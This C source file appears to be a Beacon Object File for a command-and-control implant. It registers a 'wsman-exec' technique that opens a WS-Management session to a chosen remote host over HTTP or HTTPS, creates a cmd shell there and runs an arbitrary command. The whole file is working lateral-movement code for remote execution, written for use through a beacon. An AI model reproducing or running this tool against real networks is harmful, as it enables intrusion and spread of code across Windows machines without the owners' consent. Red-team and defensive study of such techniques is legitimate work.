#include <windows.h>
#define WSMAN_API_VERSION_1_0
#include <wsman.h>

#include "beacon.h"
#include "rex.h"
#include "technique.h"

REX_DEFINE_TECHNIQUE(rex_wsman, "wsman-exec", "wsman_shell",
                     "wsman_run_shell_command", REX_DISPOSITION_COMPLETED);

DECLSPEC_IMPORT DWORD WINAPI WSMSVC$WSManInitialize(DWORD, WSMAN_API_HANDLE *);
DECLSPEC_IMPORT DWORD WINAPI WSMSVC$WSManDeinitialize(WSMAN_API_HANDLE, DWORD);
DECLSPEC_IMPORT DWORD WINAPI WSMSVC$WSManCreateSession(
    WSMAN_API_HANDLE, PCWSTR, DWORD, WSMAN_AUTHENTICATION_CREDENTIALS *,
    WSMAN_PROXY_INFO *, WSMAN_SESSION_HANDLE *);
DECLSPEC_IMPORT DWORD WINAPI WSMSVC$WSManCloseSession(WSMAN_SESSION_HANDLE,
                                                      DWORD);
DECLSPEC_IMPORT DWORD WINAPI WSMSVC$WSManCloseOperation(WSMAN_OPERATION_HANDLE,
                                                        DWORD);
DECLSPEC_IMPORT void WINAPI WSMSVC$WSManCreateShell(
    WSMAN_SESSION_HANDLE, DWORD, PCWSTR, WSMAN_SHELL_STARTUP_INFO *,
    WSMAN_OPTION_SET *, WSMAN_DATA *, WSMAN_SHELL_ASYNC *,
    WSMAN_SHELL_HANDLE *);
DECLSPEC_IMPORT void WINAPI WSMSVC$WSManRunShellCommand(
    WSMAN_SHELL_HANDLE, DWORD, PCWSTR, WSMAN_COMMAND_ARG_SET *,
    WSMAN_OPTION_SET *, WSMAN_SHELL_ASYNC *, WSMAN_COMMAND_HANDLE *);
DECLSPEC_IMPORT void WINAPI WSMSVC$WSManReceiveShellOutput(
    WSMAN_SHELL_HANDLE, WSMAN_COMMAND_HANDLE, DWORD, WSMAN_STREAM_ID_SET *,
    WSMAN_SHELL_ASYNC *, WSMAN_OPERATION_HANDLE *);
DECLSPEC_IMPORT void WINAPI WSMSVC$WSManCloseCommand(WSMAN_COMMAND_HANDLE,
                                                     DWORD,
                                                     WSMAN_SHELL_ASYNC *);
DECLSPEC_IMPORT void WINAPI WSMSVC$WSManCloseShell(WSMAN_SHELL_HANDLE, DWORD,
                                                   WSMAN_SHELL_ASYNC *);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, BOOL,
                                                    BOOL, LPCWSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SetEvent(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

typedef struct {
    HANDLE event;
    DWORD error;
    DWORD exit_code;
    BOOL receive;
    BOOL done;
} rex_wsman_operation;

typedef struct {
    WSMAN_API_HANDLE api;
    WSMAN_SESSION_HANDLE session;
    WSMAN_SHELL_HANDLE shell;
} rex_wsman_state;

static BOOL rex_wsman_transport(const wchar_t *value, BOOL *use_https,
                                USHORT *port) {
    SIZE_T index = 0;
    DWORD parsed = 0;
    BOOL explicit_port = FALSE;
    *use_https = FALSE;
    *port = 5985;
    if (value == NULL || value[0] == L'\0')
        return TRUE;
    if (value[0] == L'h' && value[1] == L't' && value[2] == L't' &&
        value[3] == L'p') {
        index = 4;
        if (value[index] == L's') {
            *use_https = TRUE;
            *port = 5986;
            index++;
        }
    } else {
        return FALSE;
    }
    if (value[index] == L'\0')
        return TRUE;
    if (value[index++] != L':')
        return FALSE;
    while (value[index] != L'\0') {
        wchar_t digit = value[index++];
        if (digit < L'0' || digit > L'9')
            return FALSE;
        explicit_port = TRUE;
        parsed = parsed * 10 + (DWORD)(digit - L'0');
        if (parsed > 65535)
            return FALSE;
    }
    if (!explicit_port || parsed == 0)
        return FALSE;
    *port = (USHORT)parsed;
    return TRUE;
}

static BOOL rex_wsman_append(wchar_t *output, SIZE_T capacity, SIZE_T *offset,
                             const wchar_t *value) {
    SIZE_T index = 0;
    while (value[index] != L'\0') {
        if (*offset + 1 >= capacity)
            return FALSE;
        output[(*offset)++] = value[index++];
    }
    output[*offset] = L'\0';
    return TRUE;
}

static BOOL rex_wsman_append_port(wchar_t *output, SIZE_T capacity,
                                  SIZE_T *offset, USHORT port) {
    wchar_t digits[5];
    SIZE_T count = 0;
    do {
        digits[count++] = (wchar_t)(L'0' + (port % 10));
        port = (USHORT)(port / 10);
    } while (port != 0);
    while (count != 0) {
        if (*offset + 1 >= capacity)
            return FALSE;
        output[(*offset)++] = digits[--count];
    }
    output[*offset] = L'\0';
    return TRUE;
}

static BOOL rex_wide_equal(const wchar_t *left, const wchar_t *right) {
    SIZE_T index = 0;
    if (left == NULL || right == NULL)
        return FALSE;
    while (left[index] != L'\0' && right[index] != L'\0') {
        if (left[index] != right[index])
            return FALSE;
        index++;
    }
    return left[index] == right[index];
}

static void CALLBACK rex_wsman_callback(PVOID context, DWORD flags,
                                        WSMAN_ERROR *error,
                                        WSMAN_SHELL_HANDLE shell,
                                        WSMAN_COMMAND_HANDLE command,
                                        WSMAN_OPERATION_HANDLE operation,
                                        WSMAN_RECEIVE_DATA_RESULT *data) {
    rex_wsman_operation *value = (rex_wsman_operation *)context;
    (void)shell;
    (void)command;
    (void)operation;
    if (error != NULL)
        value->error = error->code;
    if (value->receive && data != NULL &&
        rex_wide_equal(data->commandState, WSMAN_COMMAND_STATE_DONE)) {
        value->exit_code = data->exitCode;
        value->done = TRUE;
    }
    if ((flags & WSMAN_FLAG_CALLBACK_END_OF_OPERATION) != 0 ||
        value->error != 0 || value->done) {
        KERNEL32$SetEvent(value->event);
    }
}

static HRESULT rex_wsman_begin(rex_wsman_operation *operation,
                               WSMAN_SHELL_ASYNC *async, BOOL receive) {
    rex_zero(operation, sizeof(*operation));
    operation->event = KERNEL32$CreateEventW(NULL, FALSE, FALSE, NULL);
    if (operation->event == NULL)
        return E_OUTOFMEMORY;
    operation->receive = receive;
    async->operationContext = operation;
    async->completionFunction = rex_wsman_callback;
    return S_OK;
}

static HRESULT rex_wsman_wait(rex_wsman_operation *operation) {
    DWORD wait = KERNEL32$WaitForSingleObject(operation->event, 60000);
    HRESULT result = S_OK;
    if (wait != WAIT_OBJECT_0)
        result = HRESULT_FROM_WIN32(ERROR_TIMEOUT);
    else if (operation->error != 0)
        result = HRESULT_FROM_WIN32(operation->error);
    KERNEL32$CloseHandle(operation->event);
    operation->event = NULL;
    return result;
}

static HRESULT rex_wsman_connect(const rex_request *request,
                                 rex_wsman_state **out) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    rex_wsman_state *state = (rex_wsman_state *)KERNEL32$HeapAlloc(
        heap, HEAP_ZERO_MEMORY, sizeof(*state));
    wchar_t target[REX_MAX_TARGET + 1];
    wchar_t connection[REX_MAX_TARGET + 32];
    SIZE_T source = 0, index = 0;
    BOOL ipv6 = FALSE;
    rex_wsman_operation operation;
    WSMAN_SHELL_ASYNC async;
    DWORD error;
    HRESULT result;
    *out = NULL;
    if (state == NULL)
        return E_OUTOFMEMORY;
    if (!toWideChar((char *)request->target, target, sizeof(target))) {
        result = E_INVALIDARG;
        goto cleanup;
    }
    {
        const wchar_t *prefix =
            request->config.wsman.use_https ? L"https://" : L"http://";
        while (target[source] != L'\0') {
            if (target[source++] == L':')
                ipv6 = TRUE;
        }
        source = 0;
        connection[0] = L'\0';
        if (!rex_wsman_append(connection, REX_MAX_TARGET + 32, &index,
                              prefix) ||
            (ipv6 && !rex_wsman_append(connection, REX_MAX_TARGET + 32, &index,
                                       L"[")) ||
            !rex_wsman_append(connection, REX_MAX_TARGET + 32, &index,
                              target) ||
            (ipv6 && !rex_wsman_append(connection, REX_MAX_TARGET + 32, &index,
                                       L"]")) ||
            !rex_wsman_append(connection, REX_MAX_TARGET + 32, &index, L":") ||
            !rex_wsman_append_port(connection, REX_MAX_TARGET + 32, &index,
                                   request->config.wsman.port) ||
            !rex_wsman_append(connection, REX_MAX_TARGET + 32, &index,
                              L"/wsman")) {
            result = E_INVALIDARG;
            goto cleanup;
        }
    }
    error = WSMSVC$WSManInitialize(0, &state->api);
    if (error != 0) {
        result = HRESULT_FROM_WIN32(error);
        goto cleanup;
    }
    error = WSMSVC$WSManCreateSession(state->api, connection, 0, NULL, NULL,
                                      &state->session);
    if (error != 0) {
        result = HRESULT_FROM_WIN32(error);
        goto cleanup;
    }
    result = rex_wsman_begin(&operation, &async, FALSE);
    if (FAILED(result))
        goto cleanup;
    WSMSVC$WSManCreateShell(state->session, 0, WSMAN_CMDSHELL_URI, NULL, NULL,
                            NULL, &async, &state->shell);
    result = rex_wsman_wait(&operation);
    if (FAILED(result))
        goto cleanup;
    *out = state;
    return S_OK;
cleanup:
    if (state->session != NULL)
        WSMSVC$WSManCloseSession(state->session, 0);
    if (state->api != NULL)
        WSMSVC$WSManDeinitialize(state->api, 0);
    KERNEL32$HeapFree(heap, 0, state);
    return result;
}

static HRESULT rex_wsman_decode(const rex_arguments *arguments,
                                rex_request *request) {
    if (arguments->values[0][0] == L'\0' ||
        !rex_wsman_transport(arguments->values[2],
                             &request->config.wsman.use_https,
                             &request->config.wsman.port)) {
        return E_INVALIDARG;
    }
    request->config.wsman.executable = arguments->values[0];
    request->config.wsman.arguments = arguments->values[1];
    return S_OK;
}

static HRESULT rex_wsman_preflight(const rex_request *request,
                                   rex_state *state) {
    rex_wsman_state *wsman = NULL;
    HRESULT result = rex_wsman_connect(request, &wsman);
    if (SUCCEEDED(result))
        state->private_data = wsman;
    return result;
}

static HRESULT rex_wsman_execute(const rex_request *request, rex_state *generic,
                                 rex_observation *observation) {
    rex_wsman_state *state = (rex_wsman_state *)generic->private_data;
    HANDLE heap = KERNEL32$GetProcessHeap();
    SIZE_T executable = rex_wcslen(request->config.wsman.executable);
    SIZE_T arguments = rex_wcslen(request->config.wsman.arguments);
    wchar_t *command = (wchar_t *)KERNEL32$HeapAlloc(
        heap, HEAP_ZERO_MEMORY, (executable + arguments + 2) * sizeof(wchar_t));
    WSMAN_COMMAND_HANDLE handle = NULL;
    WSMAN_OPERATION_HANDLE receive = NULL;
    rex_wsman_operation operation;
    WSMAN_SHELL_ASYNC async;
    HRESULT result;
    SIZE_T index;
    (void)observation;
    if (command == NULL)
        return E_OUTOFMEMORY;
    for (index = 0; index < executable; index++)
        command[index] = request->config.wsman.executable[index];
    if (arguments != 0) {
        command[executable] = L' ';
        for (index = 0; index < arguments; index++)
            command[executable + 1 + index] =
                request->config.wsman.arguments[index];
    }
    result = rex_wsman_begin(&operation, &async, FALSE);
    if (FAILED(result))
        goto cleanup;
    WSMSVC$WSManRunShellCommand(state->shell, 0, command, NULL, NULL, &async,
                                &handle);
    result = rex_wsman_wait(&operation);
    if (FAILED(result))
        goto cleanup;
    result = rex_wsman_begin(&operation, &async, TRUE);
    if (FAILED(result))
        goto cleanup;
    WSMSVC$WSManReceiveShellOutput(state->shell, handle, 0, NULL, &async,
                                   &receive);
    result = rex_wsman_wait(&operation);
    if (receive != NULL)
        WSMSVC$WSManCloseOperation(receive, 0);
    if (SUCCEEDED(result) && operation.exit_code != 0)
        result = HRESULT_FROM_WIN32(operation.exit_code);
cleanup:
    if (handle != NULL) {
        if (SUCCEEDED(rex_wsman_begin(&operation, &async, FALSE))) {
            WSMSVC$WSManCloseCommand(handle, 0, &async);
            rex_wsman_wait(&operation);
        }
    }
    KERNEL32$HeapFree(heap, 0, command);
    return result;
}

static void rex_wsman_release(rex_state *generic) {
    rex_wsman_state *state = (rex_wsman_state *)generic->private_data;
    rex_wsman_operation operation;
    WSMAN_SHELL_ASYNC async;
    HANDLE heap;
    if (state == NULL)
        return;
    if (state->shell != NULL &&
        SUCCEEDED(rex_wsman_begin(&operation, &async, FALSE))) {
        WSMSVC$WSManCloseShell(state->shell, 0, &async);
        rex_wsman_wait(&operation);
    }
    if (state->session != NULL)
        WSMSVC$WSManCloseSession(state->session, 0);
    if (state->api != NULL)
        WSMSVC$WSManDeinitialize(state->api, 0);
    heap = KERNEL32$GetProcessHeap();
    KERNEL32$HeapFree(heap, 0, state);
    generic->private_data = NULL;
}
